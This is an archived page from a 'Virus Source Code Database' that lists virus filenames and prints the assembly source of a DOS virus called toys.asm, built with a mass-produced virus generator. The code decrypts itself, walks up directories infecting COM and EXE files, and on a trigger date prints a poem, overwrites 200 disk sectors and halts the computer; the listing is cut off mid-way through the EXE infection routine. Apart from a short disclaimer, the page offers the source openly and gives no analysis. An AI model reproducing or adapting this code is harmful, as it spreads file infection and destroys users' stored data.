<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: toys_asm</title>
<meta name="KEYWORDS" content="toys.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for toys.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="t_1000_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/t_1000_asm.php">t_1000_asm</a><br>
<a href="t-1000__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/t-1000__asm.php">t-1000__asm</a><br>
<a href="t-1000_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/t-1000_asm.php">t-1000_asm</a><br>
<a href="tables_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tables_asm.php">tables_asm</a><br>
<a href="taiwan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/taiwan_asm.php">taiwan_asm</a><br>
<a href="talkhead_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/talkhead_asm.php">talkhead_asm</a><br>
<a href="tbyte_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tbyte_asm.php">tbyte_asm</a><br>
<a href="tcs_troj_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tcs_troj_pas.php">tcs_troj_pas</a><br>
<a href="tempst1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tempst1_asm.php">tempst1_asm</a><br>
<a href="tenbytes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tenbytes_asm.php">tenbytes_asm</a><br>
<a href="tequila_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tequila_asm.php">tequila_asm</a><br>
<a href="terror_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/terror_asm.php">terror_asm</a><br>
<a href="test1a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test1a_asm.php">test1a_asm</a><br>
<a href="test_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test_1_asm.php">test_1_asm</a><br>
<a href="test1b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test1b_asm.php">test1b_asm</a><br>
<a href="test1c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test1c_asm.php">test1c_asm</a><br>
<a href="test2a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test2a_asm.php">test2a_asm</a><br>
<a href="test_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test_2_asm.php">test_2_asm</a><br>
<a href="test2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test2_asm.php">test2_asm</a><br>
<a href="test2b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test2b_asm.php">test2b_asm</a><br>
<a href="test2c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test2c_asm.php">test2c_asm</a><br>
<a href="test3a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test3a_asm.php">test3a_asm</a><br>
<a href="test_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test_3_asm.php">test_3_asm</a><br>
<a href="test3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test3_asm.php">test3_asm</a><br>
<a href="test3b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test3b_asm.php">test3b_asm</a><br>
<a href="test3c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test3c_asm.php">test3c_asm</a><br>
<a href="test4a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test4a_asm.php">test4a_asm</a><br>
<a href="test4b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test4b_asm.php">test4b_asm</a><br>
<a href="test4c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test4c_asm.php">test4c_asm</a><br>
<a href="test5c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test5c_asm.php">test5c_asm</a><br>
<a href="test6c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test6c_asm.php">test6c_asm</a><br>
<a href="test_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/test_asm.php">test_asm</a><br>
<a href="tetnus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tetnus_asm.php">tetnus_asm</a><br>
<a href="texto_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/texto_asm.php">texto_asm</a><br>
<a href="the_rat_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/the_rat_asm.php">the_rat_asm</a><br>
<a href="thething_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/thething_asm.php">thething_asm</a><br>
<a href="tic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tic_asm.php">tic_asm</a><br>
<a href="time_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/time_asm.php">time_asm</a><br>
<a href="timebomb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/timebomb_asm.php">timebomb_asm</a><br>
<a href="timid0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/timid0_asm.php">timid0_asm</a><br>
<a href="timid1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/timid1_asm.php">timid1_asm</a><br>
<a href="timid2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/timid2_asm.php">timid2_asm</a><br>
<a href="timid513_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/timid513_asm.php">timid513_asm</a><br>
<a href="timid526_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/timid526_asm.php">timid526_asm</a><br>
<a href="timid___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/timid___asm.php">timid___asm</a><br>
<a href="timid__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/timid__asm.php">timid__asm</a><br>
<a href="timid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/timid_asm.php">timid_asm</a><br>
<a href="tiny0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny0_asm.php">tiny0_asm</a><br>
<a href="tiny_133_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny_133_asm.php">tiny_133_asm</a><br>
<a href="tiny-133_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny-133_asm.php">tiny-133_asm</a><br>
<a href="tiny_134_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny_134_asm.php">tiny_134_asm</a><br>
<a href="tiny_138_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny_138_asm.php">tiny_138_asm</a><br>
<a href="tiny-13__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny-13__asm.php">tiny-13__asm</a><br>
<a href="tiny_143_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny_143_asm.php">tiny_143_asm</a><br>
<a href="tiny_154_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny_154_asm.php">tiny_154_asm</a><br>
<a href="tiny_156_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny_156_asm.php">tiny_156_asm</a><br>
<a href="tiny_158_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny_158_asm.php">tiny_158_asm</a><br>
<a href="tiny_159_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny_159_asm.php">tiny_159_asm</a><br>
<a href="tiny_160_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny_160_asm.php">tiny_160_asm</a><br>
<a href="tiny_163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny_163_asm.php">tiny_163_asm</a><br>
<a href="tiny_167_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny_167_asm.php">tiny_167_asm</a><br>
<a href="tiny_198_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny_198_asm.php">tiny_198_asm</a><br>
<a href="tiny1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny1_asm.php">tiny1_asm</a><br>
<a href="tiny2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny2__asm.php">tiny2__asm</a><br>
<a href="tiny2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny2_asm.php">tiny2_asm</a><br>
<a href="tiny3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny3_asm.php">tiny3_asm</a><br>
<a href="tiny4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny4_asm.php">tiny4_asm</a><br>
<a href="tiny___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny___asm.php">tiny___asm</a><br>
<a href="tiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny_asm.php">tiny_asm</a><br>
<a href="tiny-b__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny-b__asm.php">tiny-b__asm</a><br>
<a href="tiny-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny-b_asm.php">tiny-b_asm</a><br>
<a href="tinyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tinyb_asm.php">tinyb_asm</a><br>
<a href="tiny-d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny-d_asm.php">tiny-d_asm</a><br>
<a href="tiny-f__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny-f__asm.php">tiny-f__asm</a><br>
<a href="tiny-f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tiny-f_asm.php">tiny-f_asm</a><br>
<a href="tinyf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tinyf_asm.php">tinyf_asm</a><br>
<a href="tinyfv11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tinyfv11_asm.php">tinyfv11_asm</a><br>
<a href="tit_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tit_asm.php">tit_asm</a><br>
<a href="tng_182_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tng_182_asm.php">tng_182_asm</a><br>
<a href="tng_278_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tng_278_asm.php">tng_278_asm</a><br>
<a href="tng_313_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tng_313_asm.php">tng_313_asm</a><br>
<a href="tolb1147_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tolb1147_asm.php">tolb1147_asm</a><br>
<a href="tolb_626_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tolb_626_asm.php">tolb_626_asm</a><br>
<a href="tony_f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tony_f_asm.php">tony_f_asm</a><br>
<a href="tony-f_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tony-f_asm.php">tony-f_asm</a><br>
<a href="torm_205_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/torm_205_asm.php">torm_205_asm</a><br>
<a href="torm-205_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/torm-205_asm.php">torm-205_asm</a><br>
<a href="torm_358_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/torm_358_asm.php">torm_358_asm</a><br>
<a href="torm-358_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/torm-358_asm.php">torm-358_asm</a><br>
<a href="torment_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/torment_asm.php">torment_asm</a><br>
<a href="totoro__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/totoro__asm.php">totoro__asm</a><br>
<a href="totoro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/totoro_asm.php">totoro_asm</a><br>
<a href="toxic1_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/toxic1_c.php">toxic1_c</a><br>
<a href="toys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/toys_asm.php">toys_asm</a><br>
<a href="tpe11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tpe11_asm.php">tpe11_asm</a><br>
<a href="tpe12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tpe12_asm.php">tpe12_asm</a><br>
<a href="tpe13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tpe13_asm.php">tpe13_asm</a><br>
<a href="tpe_gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tpe_gen_asm.php">tpe_gen_asm</a><br>
<a href="tpe-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tpe-gen_asm.php">tpe-gen_asm</a><br>
<a href="tpe_v11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tpe_v11_asm.php">tpe_v11_asm</a><br>
<a href="tpe_v12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tpe_v12_asm.php">tpe_v12_asm</a><br>
<a href="tpe_v13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tpe_v13_asm.php">tpe_v13_asm</a><br>
<a href="tracebc__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tracebc__asm.php">tracebc__asm</a><br>
<a href="tracebck_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tracebck_asm.php">tracebck_asm</a><br>
<a href="tracker3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tracker3_asm.php">tracker3_asm</a><br>
<a href="trash_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trash_asm.php">trash_asm</a><br>
<a href="trasher__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trasher__asm.php">trasher__asm</a><br>
<a href="trasher_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trasher_asm.php">trasher_asm</a><br>
<a href="trekwar__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trekwar__asm.php">trekwar__asm</a><br>
<a href="trekwar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trekwar_asm.php">trekwar_asm</a><br>
<a href="tremor2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tremor2_asm.php">tremor2_asm</a><br>
<a href="tremor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tremor_asm.php">tremor_asm</a><br>
<a href="trid-611_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trid-611_asm.php">trid-611_asm</a><br>
<a href="trigger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trigger_asm.php">trigger_asm</a><br>
<a href="triv_126_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/triv_126_asm.php">triv_126_asm</a><br>
<a href="troi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/troi_asm.php">troi_asm</a><br>
<a href="trojan_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trojan_pas.php">trojan_pas</a><br>
<a href="trojan_hourses.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trojan_hourses.php">Trojans</a><br>
<a href="trojandoc.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trojandoc.php">Trojan Source</a><br>
<a href="trv-144_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trv-144_asm.php">trv-144_asm</a><br>
<a href="trv-29c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trv-29c_asm.php">trv-29c_asm</a><br>
<a href="trv_31b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trv_31b_asm.php">trv_31b_asm</a><br>
<a href="trv-31b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trv-31b_asm.php">trv-31b_asm</a><br>
<a href="trv-33a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trv-33a_asm.php">trv-33a_asm</a><br>
<a href="trv-33b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trv-33b_asm.php">trv-33b_asm</a><br>
<a href="trv-44b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trv-44b_asm.php">trv-44b_asm</a><br>
<a href="trv_46_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trv_46_asm.php">trv_46_asm</a><br>
<a href="trv-66_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/trv-66_asm.php">trv-66_asm</a><br>
<a href="tsd1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tsd1_asm.php">tsd1_asm</a><br>
<a href="tshark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tshark_asm.php">tshark_asm</a><br>
<a href="tsotl-a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tsotl-a_asm.php">tsotl-a_asm</a><br>
<a href="tsotl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tsotl_asm.php">tsotl_asm</a><br>
<a href="tsotl-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tsotl-b_asm.php">tsotl-b_asm</a><br>
<a href="tsr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tsr_asm.php">tsr_asm</a><br>
<a href="tstv86_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tstv86_asm.php">tstv86_asm</a><br>
<a href="tula_417_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tula_417_asm.php">tula_417_asm</a><br>
<a href="tula-417_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tula-417_asm.php">tula-417_asm</a><br>
<a href="tula-41__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/tula-41__asm.php">tula-41__asm</a><br>
<a href="turb99___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/turb99___asm.php">turb99___asm</a><br>
<a href="turbo99_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/turbo99_asm.php">turbo99_asm</a><br>
<a href="turbo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/turbo_asm.php">turbo_asm</a><br>
<a href="turbokuk_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/turbokuk_asm.php">turbokuk_asm</a><br>
<a href="turd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/turd_asm.php">turd_asm</a><br>
<a href="twist333_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/twist333_asm.php">twist333_asm</a><br>
<a href="twista_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/twista_asm.php">twista_asm</a><br>
<a href="twistb1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/twistb1_asm.php">twistb1_asm</a><br>
<a href="twistbp_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/twistbp_asm.php">twistbp_asm</a><br>
<a href="twistone_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/twistone_asm.php">twistone_asm</a><br>
<a href="twiststm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/twiststm_asm.php">twiststm_asm</a><br>
<a href="twistup2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/twistup2_asm.php">twistup2_asm</a><br>
<a href="twistup_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/twistup_asm.php">twistup_asm</a><br>
<a href="twistx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/twistx_asm.php">twistx_asm</a><br>
<a href="typo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/typo_asm.php">typo_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; toys.asm : Unknown by Unknown
; Created wik the Phalcon/Skism Mass-Produced Code Generator
; from the configuration file skeleton.cfg

.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    100h                   ; COM file starting IP

id = 'FZ'                               ; ID word for EXE infections
entry_point: db 0e9h,0,0                ; jmp decrypt

decrypt:  loop decrypt                              ; handles encryption and decryption
patch_startencrypt:
          mov  si,offset startencrypt   ; start of decryption
          mov  dx,(offset heap - offset startencrypt)/2 ; iterations
decrypt_loop:
          db   2eh,81h,34h            ; xor word ptr cs:[si], xxxx
decrypt_value dw 0                      ; initialised at zero for null effect
          inc  si                       ; calculate new decryption location
          inc  si
          dec  dx                       ; If we are not done, then
          jnz  decrypt_loop             ; decrypt mo'
startencrypt:
          call next                     ; calculate delta offset
next:     pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset

          cmp  sp,id                    ; COM or EXE?
          je   restoreEXE
restoreCOM:
          lea  si,[bp+save3]
          mov  di,100h
          push di                       ; For later return
          movsb
          jmp  short restoreEXIT
restoreEXE:
          push ds
          push es
          push cs                       ; DS = CS
          pop  ds
          push cs                       ; ES = CS
          pop  es
          lea  si,[bp+jmpsave2]
          lea  di,[bp+jmpsave]
          movsw
          movsw
          movsw
restoreEXIT:
          movsw

          mov  byte ptr [bp+numinfec],2 ; reset infection counter

          mov  ah,1Ah                   ; Set new DTA
          lea  dx,[bp+newDTA]           ; new DTA @ DS:DX
          int  21h

          mov  ah,47h                   ; Get current directory
          mov  dl,0                     ; Current drive
          lea  si,[bp+origdir]          ; DS:SI->buffer
          int  21h
          mov  byte ptr [bp+backslash],'\' ; Prepare for later CHDIR

          mov  ax,3524h                 ; Get int 24 handler
          int  21h                      ; to ES:BX
          mov  word ptr [bp+oldint24],bx; Save it
          mov  word ptr [bp+oldint24+2],es
          mov  ah,25h                   ; Set new int 24 handler
          lea  dx,[bp+offset int24]     ; DS:DX->new handler
          int  21h
          push cs                       ; Restore ES
          pop  es                       ; 'cuz it was changed

dir_scan:                               ; "dot dot" traversal
          lea  dx,[bp+exe_mask]
          call infect_mask
          lea  dx,[bp+com_mask]
          call infect_mask
          mov  ah,3bh                   ; change directory
          lea  dx,[bp+dot_dot]          ; "cd .."
          int  21h
          jnc  dir_scan                 ; go back for mo!

done_infections:
          mov  ah,2ah                   ; Get current date
          int  21h
          cmp  dh,6                     ; Check month
          cmp  dl,19                    ; Check date
          jb   exit_virus
          cmp  al,-1                    ; Check date of week
          jz   activate

          mov  ah,2ch                   ; Get current time
          int  21h
          cmp  ch,18                    ; Check the hour
          jnz  exit_virus
          cmp  cl,-1                    ; Check the minute
          jnz  exit_virus
          cmp  dh,-1                    ; Check the seconds
          jnz  exit_virus
exit_virus:
          mov  ax,2524h                 ; Restore int 24 handler
          lds  dx,[bp+offset oldint24]  ; to original
          int  21h
          push cs
          pop  ds

          mov  ah,3bh                   ; change directory
          lea  dx,[bp+origdir-1]        ; original directory
          int  21h

          mov  ah,1ah                   ; restore DTA to default
          mov  dx,80h                   ; DTA in PSP
          cmp  sp,id-4                  ; EXE or COM?
          jz   returnEXE
returnCOM:
          int  21h
          retn                          ; 100h is on stack
returnEXE:
          pop  es
          pop  ds
          int  21h
          mov  ax,es                    ; AX = PSP segment
          add  ax,10h                   ; Adjust for PSP
          add  word ptr cs:[bp+jmpsave+2],ax
          add  ax,word ptr cs:[bp+stacksave+2]
          cli                           ; Clear intrpts for stack manipulation
          mov  sp,word ptr cs:[bp+stacksave]
          mov  ss,ax
          sti
          db   0eah                     ; jmp ssss:oooo
jmpsave             dd ?                ; Original CS:IP
stacksave           dd ?                ; Original SS:SP
jmpsave2            db ?                ; Actually four bytes
save3               db 0cdh,20h,0       ; First 3 bytes of COM file
stacksave2          dd ?

activate:       mov     si,offset data00        ; SI points to data
                mov     ah,0Eh                  ; BIOS display char. function
display_loop:   lodsb                           ; Load the next char. into AL
                or      al,al                   ; Is the character a null?
                je      disp_strnend            ; If it is, exit
                int     010h                    ; BIOS video interrupt
                jmp     short display_loop      ; Do the next character
disp_strnend:

                mov     ax,0002h                ; First argument is 2
                mov     cx,00C8h                ; Second argument is 200
                cli                             ; Disable interrupts (no Ctrl-C)
                cwd                             ; Clear DX (start with sector 0)
                int     026h                    ; DOS absolute write interrupt
                sti                             ; Restore interrupts

                cli                             ; Clear the interrupt flag
                hlt                             ; HaLT the computer
                jmp     short $                 ; Just to make sure

                jmp  exit_virus

data00          db      10,13,"All my toys are broken",13,10
                db      "And so am I inside.",13,10
                db      "The carnival has closed",13,10
                db      "Years ago...",13,10,0

;creator             db '[MPC]',0        ; Mass Produced Code Generator

infect_mask:
          mov  ah,4eh                   ; find first file
          mov  cx,7                     ; any attribute
findfirstnext:
          int  21h                      ; DS:DX points to mask
          jc   exit_infect_mask         ; No mo files found

          mov  al,0h                    ; Open read only
          call open

          mov  ah,3fh                   ; Read file to buffer
          lea  dx,[bp+buffer]           ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          cmp  word ptr [bp+buffer],'ZM'; EXE?
          jz   checkEXE                 ; Why yes, yes it is!
checkCOM:
          mov  ax,word ptr [bp+newDTA+1Ah] ; Filesize in DTA
          cmp  ax,50000                 ; Is it too large?
          ja   find_next

          mov  bx,word ptr [bp+buffer+1]; get jmp location
          add  bx,heap-decrypt+3        ; Adjust for virus size
          cmp  ax,bx
          je   find_next                ; already infected
          jmp  infect_com
checkEXE: cmp  word ptr [bp+buffer+10h],id ; is it already infected?
          jnz  infect_exe
find_next:
          mov  ah,4fh                   ; find next file
          jmp  short findfirstnext
exit_infect_mask: ret

infect_exe:
          les  ax, dword ptr [bp+buffer+14h] ; Save old entry point
          mov  word ptr [bp+jmpsave2], ax
          mov  word ptr [bp+jmpsave2+2], es

          les  ax, dword ptr [bp+buffer+0Eh] ; Save old stack
          mov  word ptr [bp+stacksave2], es
          mov  word ptr [bp+stacksave2+2], ax

          mov  ax, word ptr [bp+buffer + 8] ; Get header size
          mov  cl, 4                    ; convert to bytes
          shl  ax, cl
          xchg ax, bx

          les  ax, [bp+offset newDTA+26]; Get file size
